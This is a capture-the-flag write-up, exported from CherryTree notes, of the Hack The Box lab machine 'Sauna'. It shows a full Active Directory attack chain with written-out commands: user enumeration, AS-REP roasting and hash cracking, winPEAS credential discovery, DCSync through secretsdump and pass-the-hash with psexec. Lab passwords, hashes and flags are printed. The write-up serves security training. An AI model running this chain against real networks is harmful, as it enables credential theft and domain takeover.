<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>sauna</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="#sauna">sauna</a></p>
<ol>
<li><a href="#nmapAuto">nmapAuto</a></li>
<ol>
<li><a href="#nmap">nmap</a></li>
<li><a href="#ldapsearch">ldapsearch</a></li>
</ol>
<li><a href="#http">http</a></li>
<li><a href="#vim macro breakdown">vim macro breakdown</a></li>
<li><a href="#initial foothold">initial foothold</a></li>
<ol>
<li><a href="#kerbroute">kerbroute</a></li>
<ol>
<li><a href="#run kerbrute with userlist">run kerbrute with userlist</a></li>
</ol>
<li><a href="#GetNPUser.py">GetNPUser.py</a></li>
<li><a href="#hashcat BF Kerb TGT">hashcat BF Kerb TGT</a></li>
<li><a href="#evil win-rm ">evil win-rm </a></li>
</ol>
<li><a href="#privesc">privesc</a></li>
<ol>
<li><a href="#winPEAS">winPEAS</a></li>
<li><a href="#bloodhound/sharphound.exe">bloodhound/sharphound.exe</a></li>
<ol>
<li><a href="#neo4j console">neo4j console</a></li>
<li><a href="#bloodhound report">bloodhound report</a></li>
<ol>
<li><a href="#find shortest path to Domain Admins">find shortest path to Domain Admins</a></li>
<li><a href="#Find principals with DCSync Rights">Find principals with DCSync Rights</a></li>
</ol>
</ol>
<li><a href="#secretsdump.py">secretsdump.py</a></li>
<ol>
<li><a href="#pass the hash to win">pass the hash to win</a></li>
</ol>
</ol>
<li><a href="#user/root">user/root</a></li>
</ol></div>
<div class="page"><h1><b><u>sauna</u></b></h1><img alt="images/1327-1.png" src="images/1327-1.png"/><br/><img alt="images/1327-2.png" src="images/1327-2.png"/></div></div>
</body></html><div class="page" id="sauna"><h1><b><u>sauna</u></b></h1><img alt="images/1327-1.png" src="images/1327-1.png"/><br/><img alt="images/1327-2.png" src="images/1327-2.png"/></div>
<div class="page" id="nmapAuto"><h1><b><u>nmapAuto</u></b></h1><span style="color:#24ff00;">We'll start off our enumeration by running </span><span style="color:#ffff00;">Tib3rius'</span><span style="color:#24ff00;"> nmapautomator script</span><br/><span style="color:#ffa500;">nmapAutomator.sh 10.10.10.175 All</span><br/><span style="color:#ffa500;"><br/>nmap<br/>recon</span></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><span style="color:#ffa500;">nmap -sV -sC 10.10.10.175</span><br/><img alt="images/1335-1.png" src="images/1335-1.png"/><br/><span style="color:#24ff00;"><br/>Given the scan results, It can be assumed that Sauna is an </span><span style="color:#ffff00;">Active Directory</span><span style="color:#24ff00;"> box since </span><span style="color:#ffa500;">Kerberos</span> <span style="color:#24ff00;">and </span><span style="color:#ffa500;">Active Directory LDAP</span><span style="color:#24ff00;"> are running </span></div>
<div class="page" id="ldapsearch"><h1><b><u>ldapsearch</u></b></h1><span style="color:#24ff00;">the box's </span><span style="color:#ffa500;">DC</span><span style="color:#24ff00;"> is </span><span style="color:#ffff00;">EGOTISTICAL-BANK.LOCAL</span><br/><img alt="images/1337-1.png" src="images/1337-1.png"/></div>
<div class="page" id="http"><h1><b><u>http</u></b></h1><img alt="images/404-1.png" src="images/404-1.png"/></div>
<div class="page" id="vim macro breakdown"><h1><b><u>vim macro breakdown</u></b></h1><span style="color:#24ff00;">we want to make a </span><span style="color:#ffff00;">userlist</span><span style="color:#24ff00;"> to enumerate users with the </span><span style="color:#ffa500;">kerbrute</span><span style="color:#24ff00;"> script ippsec utilized on this box<br/><br/>we can write a python script but if we can't utilize that tool we can also use</span><span style="color:#ffa500;"> vim macros</span><span style="color:#24ff00;"> to generate a nice user list without python<br/><br/></span><img alt="images/1330-1.png" src="images/1330-1.png"/><br/><br/><span style="text-decoration:underline;">keystroke macros are:</span><br/>'<span style="color:#ffa500;">q</span><span style="color:#24ff00;">' to start recording, '</span><span style="color:#ffa500;">a</span><span style="color:#24ff00;">' to bind macro to a </span><img alt="images/1330-2.png" src="images/1330-2.png"/><br/><span style="color:#ffa500;">yy</span><span style="color:#24ff00;"> - yoink line </span><span style="color:#ffff00;">Fergus Smith </span><br/><span style="color:#ffa500;">3p</span><span style="color:#24ff00;"> - paste yoinked line 3 times</span><img alt="images/1330-3.png" src="images/1330-3.png"/><img alt="images/1330-4.png" src="images/1330-4.png"/><br/>‘<span style="color:#ffa500;">home</span><span style="color:#24ff00;">' button, ‘</span><span style="color:#ffa500;">/</span><span style="color:#24ff00;">’ to start search ‘</span><span style="color:#ffa500;">spacebar</span><span style="color:#24ff00;">’ to find the next empty space '</span><span style="color:#ffa500;">enter</span><span style="color:#24ff00;">’ to set the vim curser on the space ‘</span><span style="color:#ffa500;">s</span><span style="color:#24ff00;">’ (to remove space) and ‘</span><span style="color:#ffa500;">.</span><span style="color:#24ff00;">’ </span><img alt="images/1330-5.png" src="images/1330-5.png"/>and ‘<span style="color:#ffa500;">esc</span><span style="color:#24ff00;">' (to leave insert mode)<br/>‘</span><span style="color:#ffa500;">down arrow</span><span style="color:#24ff00;">’, ‘</span><span style="color:#ffa500;">home</span><span style="color:#24ff00;">’ button, ‘</span><span style="color:#ffa500;">right arrow</span><span style="color:#24ff00;">’ to move cursor to </span><span style="color:#ffff00;">F</span><span style="color:#ffff00;background-color:#0000ff;">e</span><span style="color:#ffff00;">rgus</span><span style="color:#24ff00;"> ‘</span><span style="color:#ffa500;">dw</span><span style="color:#24ff00;">’ (delete word)</span><img alt="images/1330-6.png" src="images/1330-6.png"/><br/>‘<span style="color:#ffa500;">down arrow</span><span style="color:#24ff00;">’, ‘</span><span style="color:#ffa500;">home</span><span style="color:#24ff00;">’ button, ‘</span><span style="color:#ffa500;">right arrow</span><span style="color:#24ff00;">’ to move cursor to </span><span style="color:#ffff00;">F</span><span style="color:#ffff00;background-color:#0000ff;">e</span><span style="color:#ffff00;">rgus</span> ‘<span style="color:#ffa500;">dw</span><span style="color:#24ff00;">’ (delete word) ‘</span><span style="color:#ffa500;">i</span><span style="color:#24ff00;">’ (for insert mode) ‘</span><span style="color:#ffa500;">.</span><span style="color:#24ff00;">’, and ‘</span><span style="color:#ffa500;">esc</span><span style="color:#24ff00;">’ (to exit insert mode)</span><img alt="images/1330-7.png" src="images/1330-7.png"/><br/>‘<span style="color:#ffa500;">down arrow</span><span style="color:#24ff00;">', ‘</span><span style="color:#ffa500;">home</span><span style="color:#24ff00;">' button', and finally ‘</span><span style="color:#ffa500;">q</span><span style="color:#24ff00;">’ to stop recording</span><img alt="images/1330-8.png" src="images/1330-8.png"/><br/>now simply type  ‘<span style="color:#ffa500;">@a</span><span style="color:#24ff00;">’ to repeat the macro once or</span><img alt="images/1330-9.png" src="images/1330-9.png"/><br/>'<span style="color:#ffa500;">&lt;#&gt;@a </span><span style="color:#24ff00;">to repeat the macro </span><span style="color:#ffa500;">#</span><span style="color:#24ff00;"> times ie </span><span style="color:#ffa500;">3@a</span><span style="color:#24ff00;"> = </span><span style="color:#ffff00;">3 loops of macro</span><span style="color:#24ff00;"><br/><br/>our finished list looks like so<br/></span><img alt="images/1330-10.png" src="images/1330-10.png"/></div>
<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1><span style="color:#ffa500;">Kerbrute <br/>GetNPUser.py<br/>hashcat<br/>evilwin-rm</span></div>
<div class="page" id="kerbroute"><h1><b><u>kerbroute</u></b></h1><span style="color:#24ff00;">to run kerbrute we need the github repo, Im going to grab the released version for </span><span style="color:#ffa500;">amd64</span><span style="color:#24ff00;"> and move it to my working directory</span><br/><img alt="images/1333-1.png" src="images/1333-1.png"/><img alt="images/1333-2.png" src="images/1333-2.png"/><br/><br/><img alt="images/1333-3.png" src="images/1333-3.png"/><br/><img alt="images/1333-4.png" src="images/1333-4.png"/><br/><img alt="images/1333-5.png" src="images/1333-5.png"/><br/><img alt="images/1333-6.png" src="images/1333-6.png"/><br/><br/><img alt="images/1333-7.png" src="images/1333-7.png"/></div>
<div class="page" id="run kerbrute with userlist"><h1><b><u>run kerbrute with userlist</u></b></h1><span style="color:#24ff00;">we want to enumerate users on this box so thats the command we'll use<br/></span><img alt="images/1332-1.png" src="images/1332-1.png"/><br/><br/><img alt="images/1332-2.png" src="images/1332-2.png"/> domain controller will be <strong><span style="color:#ffa500;">10.10.10.175</span></strong><span style="color:#24ff00;"><br/><br/></span><img alt="images/1332-3.png" src="images/1332-3.png"/>also since we're attacking AD we'll use the <span style="color:#ffa500;">DC</span><span style="color:#24ff00;"> which is</span><span style="color:#ffa500;"> </span><strong><span style="color:#ffa500;">Egotisitcal-bank.local </span></strong><span style="color:#24ff00;"><br/><br/></span><strong><span style="color:#ffa500;">users.txt</span></strong><span style="color:#24ff00;"> is our userlist we're using for enumertion<br/><br/></span><span style="color:#ffa500;">./kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local users.txt</span><br/><img alt="images/1332-4.png" src="images/1332-4.png"/><br/><br/>we see <span style="color:#ffff00;">FSmith</span><span style="color:#24ff00;"> is a valid user!</span></div>
<div class="page" id="GetNPUser.py"><h1><b><u>GetNPUser.py</u></b></h1><span style="color:#24ff00;">we're going to take our enumerated user </span><span style="color:#ffff00;">fsmith</span><span style="color:#24ff00;"> and see if <br/>Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking<br/><br/></span><span style="color:#ffa500;">GetNPUsers.py egotistical-bank.local/fsmith</span><br/><img alt="images/1338-1.png" src="images/1338-1.png"/><br/><br/><img alt="images/1338-2.png" src="images/1338-2.png"/> since our name or service is not known, we should update our <span style="color:#ffa500;">/etc/hosts</span><span style="color:#24ff00;"> file to add the domain to the IP<br/><br/></span><img alt="images/1338-3.png" src="images/1338-3.png"/><br/><img alt="images/1338-4.png" src="images/1338-4.png"/><br/><br/>rerunning <span style="color:#ffa500;">getNPUsers.py:</span><br/><img alt="images/1338-5.png" src="images/1338-5.png"/><br/><br/></div>
<div class="page" id="hashcat BF Kerb TGT"><h1><b><u>hashcat BF Kerb TGT</u></b></h1><span style="color:#24ff00;">next step is to take our </span><span style="color:#ffa500;">Kerb TGT</span> <span style="color:#ffa500;">hash</span><span style="color:#24ff00;"> and</span><span style="color:#ffff00;"> brute force</span><span style="color:#24ff00;"> it for its password with</span> <span style="color:#ffa500;">hashcat</span><span style="color:#24ff00;"><br/><br/>lets save our TGT hash to the file </span><span style="color:#ffa500;">hashes</span><br/><span style="color:#ffff00;">$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:fb4e09de7f354d54190236d4413391cc$6372bb4ee5984d94f423e136420f9bb1d8f202129558e51e607881a2f3ee1848238cc00bcb687c10f0b99923e3ef72b10b8674bca265ae9543cc3b97518758585207f56d8949000e03a926e4c58944639375f09ff14232614702648b3bd3d9217ac214521b63c8c6f5b79c808b85d9d8b41f8e167ac6f262888cce44b75aadc1bf3f252c4130e88c2a346ac73ba1800597c8890eed1025fbe69b61724f5f46f7ba6a40a0bf89354590375f4aff31552d16c536a91e2fb4bad1e1d335f37918752701d8025b471149f21088885223d0e3fb709a167fcebe85f75d4bbf1de09afe7348933e10138ecfe1594c3a50ef619e7b7ec3dac78d772e7fd22a13137ec57e</span> <span style="color:#24ff00;"><br/><br/>to find out which module to use we can grep hashcat formats for the </span><img alt="images/1339-1.png" src="images/1339-1.png"/> string to find which module hashcat requires to crack Kerberos Hashes<br/><img alt="images/1339-2.png" src="images/1339-2.png"/><br/><br/>18200 works here through trial and error<br/><img alt="images/1339-3.png" src="images/1339-3.png"/><br/><br/>now to run hashcat:<br/><span style="color:#ffa500;">hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt --force</span><br/><img alt="images/1339-4.png" src="images/1339-4.png"/><br/><br/><img alt="images/1339-5.png" src="images/1339-5.png"/><br/><img alt="images/1339-6.png" src="images/1339-6.png"/><br/><span style="color:#24ff00;">PW: </span><span style="color:#ffff00;">Thestrokes23</span></div>
<div class="page" id="evil win-rm "><h1><b><u>evil win-rm </u></b></h1><span style="color:#24ff00;">using our username and the password we just cracked, we can use evil-winrm to connect as user fsmith</span><br/><br/><span style="color:#ffa500;">evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23</span><br/><img alt="images/1341-1.png" src="images/1341-1.png"/></div>
<div class="page" id="privesc"><h1><b><u>privesc</u></b></h1><span style="color:#ffa500;">winPEAS<br/>secretsdump<br/>psexec (passing hash)</span></div>
<div class="page" id="winPEAS"><h1><b><u>winPEAS</u></b></h1><span style="color:#24ff00;">here is </span><span style="color:#ffa500;">winPEAS</span><span style="color:#24ff00;"> binary location:<br/></span><img alt="images/1343-1.png" src="images/1343-1.png"/><br/>copy it to our working directory with <span style="color:#ffa500;">cp</span><span style="color:#24ff00;"><br/><br/></span><img alt="images/1343-2.png" src="images/1343-2.png"/><br/><br/>we can upload <span style="color:#ffa500;">WinPEAS</span><span style="color:#24ff00;"> easily to our victim </span><span style="color:#ffff00;">fsmith</span><span style="color:#24ff00;"> through our</span><span style="color:#ffff00;"> powershell session foothold</span><span style="color:#24ff00;"> with </span><span style="color:#ffa500;">download</span><br/><span style="color:#ffa500;">upload winPEAS.exe</span><br/><img alt="images/1343-3.png" src="images/1343-3.png"/><br/><br/><span style="color:#ffa500;">winPEAS</span><span style="color:#24ff00;"> finds Autologon creds<br/></span><span style="color:#ffa500;">svc_loadmanager</span><br/><span style="color:#ffff00;">Moneymakestheworldgoround!</span><br/><img alt="images/1343-4.png" src="images/1343-4.png"/><br/><span style="color:#ffa500;">svc_loanmanager </span><span style="color:#24ff00;">is the default username here but actually its </span><span style="color:#ffa500;">svc_loanmgr</span><span style="color:#24ff00;"><br/><br/><br/>running net user<br/></span><img alt="images/1343-5.png" src="images/1343-5.png"/></div>
<div class="page" id="bloodhound/sharphound.exe"><h1><b><u>bloodhound/sharphound.exe</u></b></h1><span style="color:#24ff00;">upload </span><span style="color:#ffa500;">sharphound</span><span style="color:#24ff00;">, run it and download the zip output it produces to view on our attack machine<br/></span><img alt="images/1345-1.png" src="images/1345-1.png"/><br/><br/><img alt="images/1345-2.png" src="images/1345-2.png"/><br/><br/><img alt="images/1345-3.png" src="images/1345-3.png"/><br/><br/><img alt="images/1345-4.png" src="images/1345-4.png"/><br/><br/><img alt="images/1345-5.png" src="images/1345-5.png"/><br/><br/></div>
<div class="page" id="neo4j console"><h1><b><u>neo4j console</u></b></h1><span style="color:#24ff00;">to run bloodhound we need to run the </span><span style="color:#ffa500;">neo4j</span><span style="color:#24ff00;"> database in the background<br/><br/></span><span style="color:#ffa500;">neo4j console</span><br/><img alt="images/1346-1.png" src="images/1346-1.png"/></div>
<div class="page" id="bloodhound report"><h1><b><u>bloodhound report</u></b></h1><span style="color:#24ff00;">To view our sharphound report on bloodhound, click and drag the .zip report file we downloaded from our victim machine and it will autogenerate our report<br/><br/>next is to mark the </span><span style="color:#ffa500;">svc_loanmgr</span><span style="color:#24ff00;"> account as </span><span style="color:#ffa500;">owned</span><span style="color:#24ff00;"> to highlight potential routes we can take to abuse security misconfigurations on the box and escalate our privileges to root<br/></span><img alt="images/1347-1.png" src="images/1347-1.png"/><br/><img alt="images/1347-2.png" src="images/1347-2.png"/></div>
<div class="page" id="find shortest path to Domain Admins"><h1><b><u>find shortest path to Domain Admins</u></b></h1><img alt="images/1348-1.png" src="images/1348-1.png"/><br/><br/><img alt="images/1348-2.png" src="images/1348-2.png"/><br/><span style="color:#24ff00;">not much to work with here since svc_loanmgr is not here</span></div>
<div class="page" id="Find principals with DCSync Rights"><h1><b><u>Find principals with DCSync Rights</u></b></h1><span style="color:#24ff00;">boom! we see our cracked </span><span style="color:#ffa500;">svc_loanmgr </span><span style="color:#24ff00;">account has </span><span style="color:#ffff00;">DCSync</span><span style="color:#24ff00;"> rights</span><br/><img alt="images/1349-1.png" src="images/1349-1.png"/><br/><img alt="images/1349-2.png" src="images/1349-2.png"/><br/><br/><br/><span style="color:#ffa500;">Bloodhound</span><span style="color:#24ff00;"> provides info on how to abuse these privileges with </span><span style="color:#ffa500;">mimikatz</span><span style="color:#24ff00;">, however </span><span style="color:#ffff00;">impacket's </span><span style="color:#ffa500;">getsecrets.py</span><span style="color:#24ff00;"> script can also use this exploit to dump</span><span style="color:#ffff00;"> user hashes</span><span style="color:#24ff00;">!</span><br/><img alt="images/1349-3.png" src="images/1349-3.png"/></div>
<div class="page" id="secretsdump.py"><h1><b><u>secretsdump.py</u></b></h1><span style="color:#24ff00;">using our newfound creds thanks to </span><span style="color:#ffa500;">winPEAS</span><br/><br/><span style="color:#ffa500;">svc_loanmgr</span><br/><span style="color:#ffff00;">Moneymakestheworldgoround!</span><br/><br/><span style="color:#ffa500;">secretsdump.py egotistical-bank.local/svc_loanmgr@10.10.10.175</span><br/><img alt="images/1344-1.png" src="images/1344-1.png"/><br/><img alt="images/1344-2.png" src="images/1344-2.png"/><span style="color:#ffff00;">Moneymakestheworldgoround!</span><br/><br/><img alt="images/1344-3.png" src="images/1344-3.png"/><br/><br/><span style="color:#ffa500;">sercrets.py</span><span style="color:#24ff00;"> dumped all the</span><span style="color:#ffff00;"> password hashes </span><span style="color:#24ff00;">of every user on the </span><span style="color:#ffff00;">Sauna</span><span style="color:#24ff00;"> Box!, from here we can use </span><span style="color:#ffa500;">psexec</span> <span style="color:#24ff00;">or </span><span style="color:#ffa500;">evil-winrm</span><span style="color:#24ff00;"> to pass the Administrator's hash and log in </span></div>
<div class="page" id="pass the hash to win"><h1><b><u>pass the hash to win</u></b></h1><span style="color:#ffff00;">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::</span><br/><br/><span style="color:#24ff00;">we can use </span><span style="color:#ffa500;">psexec</span><span style="color:#24ff00;"> to pass the </span><span style="color:#ffff00;">hash</span><span style="color:#24ff00;"> to get </span><span style="color:#ffff00;">root</span><br/><br/><span style="color:#ffa500;">psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff administrator@10.10.10.175</span><br/><img alt="images/1350-1.png" src="images/1350-1.png"/><br/><img alt="images/1350-2.png" src="images/1350-2.png"/><br/><br/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/1351-1.png" src="images/1351-1.png"/><br/><span style="color:#ffff00;">1b5520b98d97cf17f24122a55baf70cf<br/><br/></span><img alt="images/1351-2.png" src="images/1351-2.png"/><br/>f3ee04965c68257382e31502cc5e881f</div>
